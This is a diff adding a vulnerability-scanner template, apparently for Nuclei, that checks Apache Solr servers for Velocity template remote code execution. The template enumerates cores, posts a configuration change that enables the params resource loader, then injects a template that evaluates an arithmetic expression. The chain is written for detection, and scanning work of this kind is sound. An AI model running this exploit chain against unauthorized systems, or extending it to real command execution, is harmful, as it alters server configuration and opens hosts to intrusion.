@@ -1,0 +1,64 @@
+id: solr-velocity-template-rce
+info:
+  name: Solr Velocity Template RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+  description: |
+    Solr Velocity Template remote code execution vulnerability.
+
+variables:
+  r1: "{{rand_int(500, 999)}}"
+  r2: "{{rand_int(500, 999)}}"
+  result: "{{to_number(r1)*to_number(r2)}}"
+
+http:
+  - id: core-discovery
+    method: GET
+    path:
+      - "{{BaseURL}}/solr/admin/cores?wt=json"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "responseHeader"
+    extractors:
+      - type: regex
+        group: 1
+        internal: true
+        part: body
+        regex:
+          - "\"name\":\"(?P<core>[^\"]+)\""
+
+  - id: config-update
+    method: POST
+    path:
+      - "{{BaseURL}}/solr/{{core}}/config"
+    headers:
+      Content-Type: application/json
+    body: |
+      {
+        "update-queryresponsewriter": {
+          "startup": "test",
+          "name": "velocity",
+          "class": "solr.VelocityResponseWriter",
+          "template.base.dir": "",
+          "solr.resource.loader.enabled": "true",
+          "params.resource.loader.enabled": "true"
+        }
+      }
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: code-execution
+    method: GET
+    path:
+      - "{{BaseURL}}/solr/{{core}}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set(%24c%3D{{r1}}%20*%20{{r2}})%24c"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{result}}"
